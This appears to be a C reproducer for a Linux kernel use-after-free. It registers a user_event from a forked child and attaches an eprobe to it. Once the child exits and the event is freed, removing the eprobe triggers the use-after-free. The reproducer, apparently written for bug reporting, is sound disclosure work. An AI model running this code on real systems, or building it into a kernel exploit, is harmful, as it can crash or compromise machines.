// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <linux/types.h>

struct user_reg {
	__u32 size;
	__u8  enable_bit;
	__u8  enable_size;
	__u16 flags;
	__u64 enable_addr;
	__u64 name_args;
	__u32 write_index;
} __attribute__((packed));

struct user_unreg {
	__u32 size;
	__u8  disable_bit;
	__u8  __reserved;
	__u16 __reserved2;
	__u64 disable_addr;
} __attribute__((packed));

#define DIAG_IOCSREG	_IOWR('*', 0, struct user_reg *)
#define DIAG_IOCSDEL	_IOW('*', 1, char *)
#define DIAG_IOCSUNREG	_IOW('*', 2, struct user_unreg *)

static char tracing[128] = "/sys/kernel/tracing";

static int write_file(const char *path, const char *buf)
{
	int fd = open(path, O_WRONLY | O_APPEND);
	int r;

	if (fd < 0) {
		printf("[-] open(%s) failed: %s\n", path, strerror(errno));
		return -1;
	}
	r = write(fd, buf, strlen(buf));
	if (r < 0)
		printf("[-] write(%s, \"%s\") failed: %s\n", path, buf, strerror(errno));
	else
		printf("[+] wrote \"%s\" -> %s\n", buf, path);
	close(fd);
	return r < 0 ? -1 : 0;
}

static void cat_file(const char *path)
{
	char buf[4096];
	int fd = open(path, O_RDONLY);
	int n;

	if (fd < 0) {
		printf("[-] open(%s): %s\n", path, strerror(errno));
		return;
	}
	n = read(fd, buf, sizeof(buf) - 1);
	if (n < 0)
		n = 0;
	buf[n] = 0;
	printf("[*] %s:\n%s---\n", path, buf);
	close(fd);
}

static void mount_tracing(void)
{
	char p[192];

	snprintf(p, sizeof(p), "%s/user_events_data", tracing);
	if (access(p, F_OK) == 0)
		return;

	mkdir("/sys/kernel/tracing", 0700);
	if (mount("tracefs", "/sys/kernel/tracing", "tracefs", 0, NULL) == 0) {
		printf("[+] mounted tracefs on /sys/kernel/tracing\n");
		return;
	}
	mkdir("/sys/kernel/debug", 0700);
	if (mount("debugfs", "/sys/kernel/debug", "debugfs", 0, NULL) == 0)
		printf("[+] mounted debugfs\n");
	strcpy(tracing, "/sys/kernel/debug/tracing");
}

static pid_t spawn_registrar(int *to_child, int *from_child)
{
	int c2p[2], p2c[2];
	pid_t pid;

	if (pipe(c2p) || pipe(p2c))
		return -1;

	pid = fork();
	if (pid < 0)
		return -1;

	if (pid == 0) {
		struct user_reg reg;
		char path[192];
		long enable_val = 0;
		char c = 0;
		int fd;

		close(c2p[0]);
		close(p2c[1]);

		snprintf(path, sizeof(path), "%s/user_events_data", tracing);
		fd = open(path, O_RDWR);
		if (fd < 0) {
			printf("[-] child: open(%s): %s\n", path, strerror(errno));
			_exit(1);
		}

		memset(&reg, 0, sizeof(reg));
		reg.size = sizeof(reg);
		reg.enable_bit = 0;
		reg.enable_size = sizeof(long);
		reg.enable_addr = (__u64)(unsigned long)&enable_val;
		reg.name_args = (__u64)(unsigned long)"myevent u32 field";

		if (ioctl(fd, DIAG_IOCSREG, &reg) < 0) {
			printf("[-] child: DIAG_IOCSREG: %s\n", strerror(errno));
			_exit(1);
		}
		printf("[+] child: registered non-persistent user_event 'myevent'\n");

		c = 1;
		write(c2p[1], &c, 1);
		read(p2c[0], &c, 1);

		printf("[+] child: exiting -> drops fd ref and mm enabler ref\n");
		_exit(0);
	}

	close(c2p[1]);
	close(p2c[0]);
	*from_child = c2p[0];
	*to_child = p2c[1];
	return pid;
}

int main(void)
{
	char path[192];
	int to_child, from_child;
	pid_t pid;
	char c;
	int status;

	setvbuf(stdout, NULL, _IONBF, 0);

	write_file("/proc/sys/kernel/printk", "8 4 1 7\n");

	mount_tracing();
	printf("[*] tracing dir: %s\n", tracing);

	pid = spawn_registrar(&to_child, &from_child);
	if (pid < 0) {
		printf("[-] fork failed\n");
		return 1;
	}
	if (read(from_child, &c, 1) != 1) {
		printf("[-] child failed to register\n");
		return 1;
	}

	snprintf(path, sizeof(path), "%s/events/user_events/myevent/format", tracing);
	cat_file(path);

	snprintf(path, sizeof(path), "%s/dynamic_events", tracing);
	if (write_file(path, "e:myep user_events/myevent field=$field\n") < 0) {
		if (write_file(path, "e:myep user_events/myevent\n") < 0)
			return 1;
	}
	cat_file(path);

	c = 1;
	write(to_child, &c, 1);
	waitpid(pid, &status, 0);
	printf("[+] registrar exited; waiting for delayed_destroy_user_event()\n");
	sleep(2);

	snprintf(path, sizeof(path), "%s/events/user_events/myevent/format", tracing);
	if (access(path, F_OK) == 0) {
		printf("[-] user_event still present -- destroy did not run\n");
		return 1;
	}
	printf("[+] struct user_event has been freed (tracefs entry is gone)\n");

	snprintf(path, sizeof(path), "%s/dynamic_events", tracing);
	cat_file(path);

	printf("[*] removing eprobe -> expect KASAN use-after-free\n");
	write_file(path, "-:myep\n");

	printf("[*] done (no crash?)\n");
	return 0;
}
